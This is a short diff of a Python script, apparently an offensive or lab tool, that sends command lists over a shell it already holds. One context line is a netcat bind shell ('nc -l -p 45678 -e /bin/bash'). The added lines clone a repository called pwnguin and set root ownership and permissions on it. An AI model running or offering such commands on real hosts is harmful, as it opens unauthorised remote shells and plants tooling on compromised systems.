@@ -327,7 +327,12 @@ if __name__ == "__main__":
         "echo matthislemechan",
         "nc -l -p 45678 -e /bin/bash",
     ]
-
+    sequence2 = [
+        "git clone https://github.com/kiso6/pwnguin",
+        "chown root:root pwnguin",
+        "cd pwnguin",
+        "chmod -R 700 ."
+    ]
     sendCommands(shell, sequence)
 
     LOG("END OF LOGS", logfile, "crit")
